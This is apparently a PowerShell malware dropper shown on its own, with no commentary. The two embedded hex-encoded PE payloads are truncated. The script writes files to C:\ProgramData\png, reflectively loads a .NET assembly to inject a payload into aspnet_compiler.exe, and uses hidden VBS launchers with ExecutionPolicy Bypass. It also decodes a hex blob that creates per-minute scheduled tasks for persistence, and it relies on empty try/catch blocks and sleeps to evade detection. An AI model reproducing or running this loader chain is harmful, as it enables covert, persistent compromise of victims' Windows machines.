$xa = "C:\ProgramData\png"
New-Item $xa -ItemType Directory -Force
Start-Sleep 1
$Content = @'
Try{
function go {
param($COIN)$COIN = $COIN -split '(..)' | ? { $_ }
ForEach ($chrome in $COIN){[Convert]::ToInt32($chrome,16)}}
}catch{}
Try{
[byte[]] $MyS  = go('4D5A9000...00000000') # NOTE: The actual 126976-character Base64 string omitted for readability.
[byte[]] $RNP  = go('4D5A900003000...00000000'); # NOTE: The actual 171008-character Base64 string omitted for readability.
}catch{}
Try{
$x = [Reflection.Assembly]}catch{}
Try{
$load = 'Load'}catch{}
Try{
$COIN = 'NewPE.PE'}catch{}
Try{
$h = $x::$load($RNP).GetType($COIN)}catch{}
Try{
Start-Sleep 1
$k = 'Execute'}catch{}
Try{
$o = $h.'GetMethod'($k)}catch{}
Try{
	Start-Sleep 1
$Z = 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe'}catch{}
Try{
Start-Sleep 1
$C = [OBJECT[]]}catch{}
Try{
$hh = $null,{$C}}catch{}
Try{
Start-Sleep 1
$o.Invoke($hh, ($Z,$MyS))}catch{}
schtasks /delete /tn det /f
'@
[IO.File]::WriteAllText("C:\ProgramData\png\Report", $Content)
function go {
param($Y6c)$Y6c = $Y6c -split '(..)' | ? { $_ }
ForEach ($chrome in $Y6c){[Convert]::ToInt32($chrome,16)}}
[byte[]] $bytes2  = go('747279200D0A7B0D0A26277363687461736B732E6578652720272F6372656174652720272F73632720276D696E7574652720272F6D6F2720363020272F746E272027706E672720272F74722720282827433A5C50726F6772616D446174615C706E675C4C6F616465722729293B0D0A0D0A26277363687461736B732E6578652720272F6372656174652720272F73632720276D696E7574652720272F6D6F27203120272F746E2720276465742720272F74722720282827433A5C50726F6772616D446174615C706E675C4C6F616465722729293B0D0A0D0A7D206361746368207B207D')
[io.file]::WriteAllBytes('C:\ProgramData\png\install',$bytes2)
$Content = @'
on error resume next
set A = CreateObject("WScript.Shell")
A.run "powershell -ExecutionPolicy Bypass iex([IO.File]::ReadAllText('C:\ProgramData\png\Report'))",0
'@
[IO.File]::WriteAllText("C:\ProgramData\png\Loader.vbs", $Content)
$Content = @'
on error resume next
set A = CreateObject("WScript.Shell")
A.run "powershell -ExecutionPolicy Bypass iex([IO.File]::ReadAllText('C:\ProgramData\png\install'))",0
'@
[IO.File]::WriteAllText("C:\ProgramData\png\install.vbs", $Content)
Start-Sleep 6
start "C:\ProgramData\png\install.vbs"